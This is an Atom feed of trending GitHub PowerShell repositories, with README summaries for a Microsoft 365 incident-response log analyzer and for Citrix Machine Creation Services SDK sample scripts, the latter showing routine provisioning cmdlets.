<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-04-10T01:34:16Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>evild3ad/Microsoft-Analyzer-Suite</title>
    <updated>2024-04-10T01:34:16Z</updated>
    <id>tag:github.com,2024-04-10:/evild3ad/Microsoft-Analyzer-Suite</id>
    <link href="https://github.com/evild3ad/Microsoft-Analyzer-Suite" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A collection of PowerShell scripts for analyzing data from Microsoft 365 and Microsoft Entra ID&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/badge/Language-Powershell-blue&#34;&gt; &lt;a href=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/wiki&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Wiki-Documentation-blue&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/Maintenance%20Level-Actively%20Developed-brightgreen&#34;&gt; &lt;a href=&#34;https://twitter.com/Evild3ad79&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/Evild3ad79?style=social&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/InvictusIR&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/InvictusIR?style=social&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Microsoft-Analyzer-Suite (Community Edition)&lt;/h1&gt; &#xA;&lt;p&gt;A collection of PowerShell scripts for analyzing data from Microsoft 365 and Microsoft Entra ID.&lt;/p&gt; &#xA;&lt;h2&gt;TL;DR&lt;/h2&gt; &#xA;&lt;p&gt;Automated Processing of Microsoft 365 Logs and Microsoft Entra ID Logs extracted by &lt;a href=&#34;https://github.com/invictus-ir/Microsoft-Extractor-Suite&#34;&gt;Microsoft-Extractor-Suite&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;The following Microsoft data sources are supported yet:&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Output Files of Microsoft-Extractor-Suite v1.3.2 by Invictus-IR&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://microsoft-365-extractor-suite.readthedocs.io/en/latest/functionality/AzureSignInLogsGraph.html&#34;&gt;Get-ADSignInLogsGraph&lt;/a&gt; → &lt;a href=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/wiki/ADSignInLogsGraph%E2%80%90Analyzer&#34;&gt;ADSignInLogsGraph-Analyzer v0.1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://microsoft-365-extractor-suite.readthedocs.io/en/latest/functionality/GetUserInfo.html#retrieves-mfa-status&#34;&gt;Get-MFA&lt;/a&gt; → &lt;a href=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/wiki/MFA%E2%80%90Analyzer&#34;&gt;MFA-Analyzer v0.1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://microsoft-365-extractor-suite.readthedocs.io/en/latest/functionality/GetUserInfo.html#retrieves-the-risky-detections&#34;&gt;Get-RiskyDetections&lt;/a&gt; → &lt;a href=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/wiki/RiskyDetections%E2%80%90Analyzer&#34;&gt;RiskyDetections-Analyzer v0.2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://microsoft-365-extractor-suite.readthedocs.io/en/latest/functionality/GetUserInfo.html#retrieves-the-risky-users&#34;&gt;Get-RiskyUsers&lt;/a&gt; → &lt;a href=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/wiki/RiskyUsers%E2%80%90Analyzer&#34;&gt;RiskyUsers-Analyzer v0.2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/01.png&#34; alt=&#34;RiskyDetections-Analyzer&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 1:&lt;/strong&gt; RiskyDetections-Analyzer&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/02.png&#34; alt=&#34;RiskyDetections-1&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 2:&lt;/strong&gt; Risky Detections (1)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/03.png&#34; alt=&#34;RiskyDetections-2&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 3:&lt;/strong&gt; Risky Detections (2)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/04.png&#34; alt=&#34;RiskyDetections-LineChart&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 4:&lt;/strong&gt; Risky Detections (Line Chart)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/05.png&#34; alt=&#34;RiskyDetections-mitreTechniques&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 5:&lt;/strong&gt; MITRE ATT&amp;amp;CK Techniques (Stats)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/06.png&#34; alt=&#34;RiskyDetections-RiskEventType&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 6:&lt;/strong&gt; RiskEventType (Stats)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/07.png&#34; alt=&#34;RiskyDetections-RiskLevel&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 7:&lt;/strong&gt; RiskLevel (Stats)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/08.png&#34; alt=&#34;RiskyDetections-Source&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 8:&lt;/strong&gt; Source (Stats)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/09.png&#34; alt=&#34;RiskyUsers-Analyzer&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 9:&lt;/strong&gt; RiskyUsers-Analyzer&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/evild3ad/Microsoft-Analyzer-Suite/raw/bf004f386ed5af210a0b326c24dcf50fccc9adf4/Screenshots/10.png&#34; alt=&#34;RiskyUsers&#34;&gt;&lt;br&gt; &lt;strong&gt;Fig 10:&lt;/strong&gt; Risky Users&lt;/p&gt; &#xA;&lt;h2&gt;Links&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/invictus-ir/Microsoft-Extractor-Suite&#34;&gt;Microsoft-Extractor-Suite by Invictus-IR&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://microsoft-365-extractor-suite.readthedocs.io/en/latest/&#34;&gt;Microsoft-Extractor-Suite Documentation&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://go.microsoft.com/fwlink/?linkid=2257423&#34;&gt;Microsoft 365 Artifact Reference Guide by the Microsoft Incident Response Team&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/randomaccess3/Awesome-BEC&#34;&gt;Awesome BEC - Repository of attack and defensive information for Business Email Compromise investigations&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/randomaccess3/detections/raw/main/M365_Oauth_Apps/MaliciousOauthAppDetections.json&#34;&gt;M365_Oauth_Apps - Repository of suspicious Enterprise Applications (BEC)&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>citrix/citrix-mcs-sdk-samples</title>
    <updated>2024-04-10T01:34:16Z</updated>
    <id>tag:github.com,2024-04-10:/citrix/citrix-mcs-sdk-samples</id>
    <link href="https://github.com/citrix/citrix-mcs-sdk-samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Sample scripts for admins who are using Machine Creation Services (MCS) Provisioning&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SDK Samples for Citrix® Machine Creation Services (MCS)&lt;/h1&gt; &#xA;&lt;p&gt;The goal of this open source repository is to provide sample scripts for admins who are using Machine Creation Services (MCS) Provisioning. This repository contains sample PowerShell scripts for DaaS and on-prem deployments. These scripts include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Starter scripts for core MCS PowerShell cmdlets for learning how to start using MCS PowerShell cmdlets for CRUD operations.&lt;/li&gt; &#xA; &lt;li&gt;Feature-specific scripts for exploring a specific MCS-feature. Features are hosting platform specific, meaning that each hosting platform will have a different feature set.&lt;/li&gt; &#xA; &lt;li&gt;Admin scripts for implementing common end-to-end scenarios, such as creating a catalog.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The scripts provided are as is and not officially supported by Citrix Support. Please refer to the sections below for specifics on license and supportability.&lt;/p&gt; &#xA;&lt;p&gt;Throughout this page, Citrix developer docs are referenced so you can learn more about specific cmdlets. Generally, these docs link to Citrix DaaS. If you are looking for the equivalent CVAD links, please refer to: &lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release&#34;&gt;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;p&gt;The scripts in this repository utilize Citrix PowerShell cmdlets. For Cloud deployments (DaaS), these scripts can be run via the Remote PowerShell SDK. Once downloaded, you can run the &lt;code&gt;Get-XdAuthentication&lt;/code&gt; cmdlet to authenticate to Citrix Cloud. This must be done once per PowerShell session. Once completed, you can run the PowerShell cmdlets on your remote machine. For more information on how to set this up, refer to &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/sdk-api#citrix-daas-remote-powershell-sdk&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/sdk-api#citrix-daas-remote-powershell-sdk&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For on-prem deployments (CVAD), the cmdlets can be run directly on the DDC or remotely. With CVAD, you will need to specify the &lt;code&gt;-AdminAddress&lt;/code&gt; parameter when calling the Citrix cmdlets. For example, &lt;code&gt;-AdminAddress&lt;/code&gt; can be added to the New-ProvScheme command as shown here:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;New-ProvScheme -AdminAddress &#34;localhost:19097&#34;&#xA;-CleanOnBoot:$isCleanOnBoot &#xA;-ProvisioningSchemeName $provisioningSchemeName &#xA;-HostingUnitName $hostingUnitName &#xA;-IdentityPoolName $identityPoolName &#xA;-InitialBatchSizeHint $numberOfVms &#xA;-MasterImageVM $masterImageVm &#xA;-NetworkMapping $networkMapping &#xA;-CustomProperties $customProperties &#xA;-MachineProfile $machineProfile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information, refer to &lt;a href=&#34;https://support.citrix.com/article/CTX222326/how-to-configure-powershell-sdk-and-execute-commands-remotely-in-xenappxendesktop-7x&#34;&gt;https://support.citrix.com/article/CTX222326/how-to-configure-powershell-sdk-and-execute-commands-remotely-in-xenappxendesktop-7x&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To view the version of the PowerShell SDK, navigate to Control Panel &amp;gt; Programs &amp;gt; Programs and Features. If you need to view the version of each individual Citrix PowerShell snap-in, run the following Powershell command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-Package | Where-Object Name -Like &#39;Citrix*&#39; | Sort-Object Name | Select Name, Version&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To view the installed Citrix PowerShell snap-ins and PSVersions, run the following Powershell command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-PsSnapin -Registered Citrix.*&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To view the Citrix PowerShell snap-ins that have been added to the current session, run the following PowerShell command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-PsSnapin &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;To start using the scripts, you can clone the repository to your local machine. Note that these scripts may create resources in your environment. Before running a script, review the content to understand the environmental impact. To clone the repository:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/citrix/citrix-mcs-sdk-samples.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Navigating the Repository&lt;/h3&gt; &#xA;&lt;p&gt;The repository is sorted by hosting platform/hypervisor, with each platform having its own folder. Within each folder, scripts are sorted by the major logical operation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hosting Connection&lt;/li&gt; &#xA; &lt;li&gt;Hosting Unit&lt;/li&gt; &#xA; &lt;li&gt;Identity&lt;/li&gt; &#xA; &lt;li&gt;ProvScheme&lt;/li&gt; &#xA; &lt;li&gt;ProvVM&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Each folder contains:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Basic starter scripts for CRUD operations. These scripts show basic examples of the MCS PowerShell cmdlets. You can copy these scripts locally and start adding to them as needed for your use case.&lt;/li&gt; &#xA; &lt;li&gt;Feature-specific folders. These folders contain examples of how to adjust the PowerShell cmdlets to start using a specific feature.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Each hosting platform also contains a folder called SampleAdminScenarios. This contains scripts for common MCS admin operations (such as end-to-end catalog creation).&lt;/p&gt; &#xA;&lt;h2&gt;MCS Building Blocks&lt;/h2&gt; &#xA;&lt;p&gt;With Machine Creation Services (MCS), you can provision and power manage virtual machines in major hosting platforms. There are several building blocks required for an end-to-end MCS deployment:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hosting Connection&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This is a connection between Citrix and the hosting platform. Typically, the hosting connection includes a URL, a set of credentials, and a hosting platform/hypervisor type.&lt;/li&gt; &#xA;   &lt;li&gt;To learn more about connections, see &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/install-configure/connections&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/install-configure/connections&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hosting Unit&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Hosting Units reside under hosting connections. They define hypervisor resources, such as storage, that can be used to provision virtual machines.&lt;/li&gt; &#xA;   &lt;li&gt;To learn more about hosting units, see &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#overview&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#overview&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Identity&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;An Identity Pool is a collection of machine identities. Each machine in a Provisioning Scheme will have a unique identity under the identity pool.&amp;nbsp;&lt;/li&gt; &#xA;   &lt;li&gt;To learn more about identity, see &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#machine-identities&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#machine-identities&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Provisioning Scheme (ProvScheme)&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Provisioning Schemes can be thought of as a template that stores a VM configuration. It includes information such as CPU, Memory Size, Master Image Path, etc. All virtual machines under a Provisioning Scheme are created from this base template.&lt;/li&gt; &#xA;   &lt;li&gt;To learn more about Provisioning Schemes, see: &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#overview&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create#overview&lt;/a&gt; &lt;a href=&#34;https://support.citrix.com/article/CTX233505/provisioning-schemefaqs&#34;&gt;https://support.citrix.com/article/CTX233505/provisioning-schemefaqs&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Provisioned VM (ProvVM)&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;A ProvVM is a virtual machine that is created based on a ProvScheme. ProvSchemes can have many ProvVMs, and each ProvVM has a unique identity.&lt;/li&gt; &#xA;   &lt;li&gt;To learn more about ProvVMs, see &lt;a href=&#34;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create.html#machines&#34;&gt;https://docs.citrix.com/en-us/citrix-daas/install-configure/machine-catalogs-create.html#machines&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;A visual representation of how these components fit together is shown below: &lt;img src=&#34;https://raw.githubusercontent.com/citrix/citrix-mcs-sdk-samples/main/images/MCS-BuildingBlocks.png&#34; alt=&#34;MCS Building Blocks&#34; title=&#34;MCS Building Blocks&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;For a deeper dive into the MCS architecture, we recommend reviewing these documents:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/understanding-xendesktop-administration-model&#34;&gt;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/understanding-xendesktop-administration-model&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.citrix.com/en-us/tech-zone/design/reference-architectures/image-management.html#machine-creation-services-mcs&#34;&gt;https://docs.citrix.com/en-us/tech-zone/design/reference-architectures/image-management.html#machine-creation-services-mcs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.citrix.com/en-us/tech-zone/design/design-decisions/image-management.html&#34;&gt;https://docs.citrix.com/en-us/tech-zone/design/design-decisions/image-management.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Creating an MCS Connection, Catalog, and Machines&lt;/h2&gt; &#xA;&lt;p&gt;Now that we understand the basic building blocks, let&#39;s put it all together. This section reviews the steps in creating a catalog for MCS provisioning. Consider the Studio UI, which includes several buttons to automate tasks. Behind the scenes, the UI is calling PowerShell cmdlets. This section maps the Studio UI buttons to the PowerShell cmdlets.&lt;/p&gt; &#xA;&lt;h3&gt;Add Connection and Resources:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Studio UI&lt;/strong&gt;&lt;/em&gt;&lt;br&gt; !&lt;img src=&#34;https://raw.githubusercontent.com/citrix/citrix-mcs-sdk-samples/main/images/Studio-ConnectionResources.png&#34; alt=&#34;drawing&#34; width=&#34;600&#34;&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Equivalent PowerShell cmdlets&lt;/strong&gt;&lt;/em&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;First, a Hosting Connection is created: &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/hostservice/set-hypadminconnection&#34;&gt;&lt;strong&gt;Set-HypAdminConnection&lt;/strong&gt;.&lt;/a&gt; Sets the controller address to be used by the cmdlets.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;strong&gt;New-Item.&lt;/strong&gt; Creates the connection to the hosting platform.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/new-brokerhypervisorconnection&#34;&gt;&lt;strong&gt;New-BrokerHypervisorConnection.&lt;/strong&gt;&lt;/a&gt; Adds the connection to the Broker service.&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Next, a Hosting Unit is created: &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;strong&gt;New-Item.&lt;/strong&gt; Creates the hosting unit (or resources).&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;More information on the process can be found here: &lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/creating-and-configuring-a-host.html&#34;&gt;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/creating-and-configuring-a-host.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Create Machine Catalog&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Studio UI&lt;/strong&gt;&lt;/em&gt;&lt;br&gt; !&lt;img src=&#34;https://raw.githubusercontent.com/citrix/citrix-mcs-sdk-samples/main/images/Studio-CreateMachineCatalog.png&#34; alt=&#34;drawing&#34; width=&#34;600&#34;&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;strong&gt;Equivalent PowerShell cmdlets&lt;/strong&gt;&lt;/strong&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Create the Broker Catalog: &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/new-brokercatalog&#34;&gt;New-BrokerCatalog.&lt;/a&gt;&lt;/strong&gt; This adds a new Broker Catalog to the site. It is not yet associated with a Provisioning Scheme.&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Create the Identity Pool: &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/adidentity/new-acctidentitypool&#34;&gt;&lt;strong&gt;New-AcctIdentityPool.&lt;/strong&gt;&lt;/a&gt; Creates a new identity pool, which will store the AD accounts for the provisioned VMs.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/set-brokercatalogmetadata&#34;&gt;&lt;strong&gt;Set-BrokerCatalogMetadata.&lt;/strong&gt;&lt;/a&gt; Associates the broker catalog and the identity pool.&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Create the Provisioning Scheme: &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/machinecreation/new-provscheme&#34;&gt;&lt;strong&gt;New-ProvScheme.&lt;/strong&gt;&lt;/a&gt; Creates the ProvScheme.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/set-brokercatalog&#34;&gt;&lt;strong&gt;Set-BrokerCatalog.&lt;/strong&gt;&lt;/a&gt; Associates the broker catalog and the ProvScheme.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/machinecreation/add-provschemecontrolleraddress&#34;&gt;&lt;strong&gt;Add-ProvSchemeControllerAddress.&lt;/strong&gt;&lt;/a&gt; Adds controller address to the ProvScheme object.&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Provision the VM(s): &#xA;    &lt;ol&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/adidentity/new-acctadaccount&#34;&gt;&lt;strong&gt;New-AcctADAccount&lt;/strong&gt;&lt;/a&gt;. Creates AD Accounts for the VMs.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/machinecreation/new-provvm&#34;&gt;&lt;strong&gt;New-ProvVm.&lt;/strong&gt;&lt;/a&gt; Create the virtual machine based on the ProvScheme.&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/new-brokermachine&#34;&gt;&lt;strong&gt;New-BrokerMachine.&lt;/strong&gt;&lt;/a&gt; Create a Broker Machine object, which associates the VM with the Broker catalog.&lt;/li&gt; &#xA;    &lt;/ol&gt; &lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;More information on the process can be found here: &lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/creating-a-catalog&#34;&gt;https://developer-docs.citrix.com/en-us/citrix-virtual-apps-desktops-sdk/current-release/creating-a-catalog&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Add machines&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Studio UI&lt;/strong&gt;&lt;/em&gt;&lt;br&gt; !&lt;img src=&#34;https://raw.githubusercontent.com/citrix/citrix-mcs-sdk-samples/main/images/Studio-AddMachines.png&#34; alt=&#34;drawing&#34; width=&#34;600&#34;&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;strong&gt;Equivalent PowerShell cmdlets&lt;/strong&gt;&lt;/strong&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/adidentity/new-acctadaccount&#34;&gt;&lt;strong&gt;New-AcctADAccount&lt;/strong&gt;&lt;/a&gt;. Creates AD Accounts for the VMs. &lt;em&gt;Note:&lt;/em&gt; ADAccount creation in DaaS may take a bit longer than in CVAD due to actions being routed through the Cloud Connector.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/machinecreation/new-provvm&#34;&gt;&lt;strong&gt;New-ProvVm.&lt;/strong&gt;&lt;/a&gt; Create the virtual machine based on the ProvScheme.&amp;nbsp;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/broker/new-brokermachine&#34;&gt;&lt;strong&gt;New-BrokerMachine.&lt;/strong&gt;&lt;/a&gt; Create a Broker Machine object, which associates the VM with the Broker catalog.&amp;nbsp;&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;A Note on Configuration Logging Operations&lt;/h3&gt; &#xA;&lt;p&gt;For each of the above operations, you can optionally configure a high-level logging operation. The Studio UI automatically triggers these logging operations for actions that alter the configuration of your site (ex: creating a hosting unit, creating a catalog, etc). To Start or Stop a logging operation, you can use the following cmdlets:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/ConfigLogging/Start-LogHighLevelOperation.html&#34;&gt;Start-LogHighLevelOperation&lt;/a&gt;.&lt;/strong&gt; Starts a logging operation with a Log ID, which can be used to link subsequent commands in the operation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/configlogging/stop-loghighleveloperation&#34;&gt;Stop-LogHighLevelOperation&lt;/a&gt;&lt;/strong&gt;. Completes the logging operation.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Some provisioning operations, such as New-ProvScheme and New-ProvVM, are long-running tasks. You can check the status of a task via the &lt;a href=&#34;https://developer-docs.citrix.com/en-us/citrix-daas-sdk/machinecreation/get-provtask&#34;&gt;Get-ProvTask&lt;/a&gt; command.&lt;/p&gt; &#xA;&lt;h2&gt;License 